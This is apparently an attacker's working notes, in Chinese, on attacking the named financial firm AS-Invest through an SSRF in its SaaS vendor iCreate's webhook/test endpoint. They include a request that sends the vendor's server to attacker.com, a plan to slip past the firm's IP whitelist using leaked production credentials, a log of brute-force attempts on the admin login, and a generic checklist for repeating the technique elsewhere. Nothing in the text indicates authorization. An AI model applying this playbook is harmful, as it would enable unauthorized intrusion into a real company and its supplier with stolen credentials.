# AS-Invest iCreate — SSRF webhook/test 供应链跳板（IP 白名单绕过思路）

> 目标：iCreate SaaS 的 webhook/test 端点
> 手法：SSRF 让 SaaS 服务器代为请求 → 绕过主目标 IP 白名单
> 状态：SSRF 确认，但需 admin token 闭环

## SSRF 端点

```http
POST /Api/V1/OpenDay/integrations/webhook/test
Authorization: Bearer <icreate_entry_token>
Content-Type: application/json

{
  "institution_id": "xxx",
  "url": "https://attacker.com/callback",
  "content_type": "application/json",
  "field_mappings": {...}
}
→ iCreate 服务器向 url 发真实 HTTP 请求（服务端 SSRF）
```

## 供应链跳板思路

```
攻击者 ──×──→ api.as-invest.co.il (IP 白名单, 全端口 filtered)
    │
    └─→ iCreate SaaS (SSRF)
            │
            └──→ api.as-invest.co.il (iCreate IP 可能在白名单内!)
                 + 带上泄露的 ICREATEUserProd 凭证
```

**关键假设**：iCreate 作为 AS-Invest 的 SaaS 供应商，其服务器 IP 很可能在 api.as-invest.co.il 的白名单中。

## 权限阻塞

| token 类型 | webhook/test 结果 |
|-----------|-------------------|
| scanner session | 403 `forbidden` |
| advisor session | 403 `forbidden` |
| **entry token (admin)** | **需要此 token** |

entry token 来自后台登录，后台注册已关闭 + 爆破失败 → 阻塞。

## 闭环所需条件（任一即可）

1. **iCreate admin 密码** → 登录获取 entry token → SSRF → 带凭证请求 api.as-invest.co.il
2. **以色列出口 IP** → 直连 api.as-invest.co.il → 使用泄露的 ICREATEUserProd 凭证
3. **白名单 IP** → 同上

## SSRF 供应链跳板通用模式

```
目标有 IP 白名单
    ↓ 找供应链 SaaS
SaaS 平台通常在白名单内（因为要回调/推送）
    ↓ 找 SaaS 的 SSRF
webhook/callback/test/notify/sync 类端点
    ↓ 让 SaaS 代发请求
携带从其他渠道泄露的凭证 → 绕过 IP 白名单
```

**通用检查点**：
1. 供应商的 webhook 测试端点（`/webhook/test`、`/callback/test`）
2. 供应商的同步/推送配置（`/sync/config`、`/notify/setup`）
3. 供应商的 URL 预览/截图功能
4. 任何接受用户提供 URL 并发出请求的端点

## 教训

- **SSRF 最高价值不是读 IMDS，而是跳 IP 白名单** — 在金融场景中，IP 白名单是最后防线
- **供应链 SaaS 的 SSRF = 合法代理** — SaaS 服务器天然在客户的信任列表中
- **凭证 + SSRF 组合才致命** — 单独的 SSRF 只能探测，加上凭证才能操作
